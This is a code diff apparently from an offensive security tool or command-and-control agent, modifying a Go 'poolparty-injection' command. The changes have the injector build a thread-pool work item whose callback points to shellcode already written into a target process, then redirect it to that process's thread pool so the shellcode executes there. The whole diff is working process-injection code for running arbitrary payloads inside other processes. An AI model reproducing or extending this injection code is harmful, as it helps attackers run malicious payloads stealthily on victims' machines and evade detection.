@@ -214,6 +214,7 @@ var (
 	procRtlNtStatusToDosError             = ntdll.NewProc("RtlNtStatusToDosError")
 	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
 	procCreateThreadpoolWork              = kernel32.NewProc("CreateThreadpoolWork")
+	procCloseThreadpoolWork               = kernel32.NewProc("CloseThreadpoolWork")
 )
 
 // PoolPartyInjectionCommand implements the poolparty-injection command
@@ -497,21 +498,28 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
 
-	// Step 8: Manually construct TP_WORK structure (avoiding CreateThreadpoolWork's local pointers)
+	// Step 8: Create TP_WORK structure via CreateThreadpoolWork (exactly as SafeBreach does)
+	pTpWork, _, err := procCreateThreadpoolWork.Call(
+		shellcodeAddr, // Work callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if pTpWork == 0 {
+		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
+	}
+	output += "[+] Created TP_WORK structure associated with shellcode\n"
+
+	// Step 9: Read and modify the TP_WORK structure
 	var tpWork FULL_TP_WORK
-	
-	// Zero out the structure first
-	tpWorkBytes := (*[unsafe.Sizeof(tpWork)]byte)(unsafe.Pointer(&tpWork))
-	for i := range tpWorkBytes {
-		tpWorkBytes[i] = 0
+	// Copy the structure from our local process
+	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
+		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
+			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
 	}
 	
-	output += "[+] Initialized TP_WORK structure\n"
+	// Close the local TP_WORK now that we've copied it
+	procCloseThreadpoolWork.Call(pTpWork)
 
-	// Step 9: Set required fields for TP_WORK
-	// Set the callback to point to our shellcode
-	tpWork.CleanupGroupMember.Callback = shellcodeAddr
-	
 	// Modify: Point Pool to target's TP_POOL
 	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 	
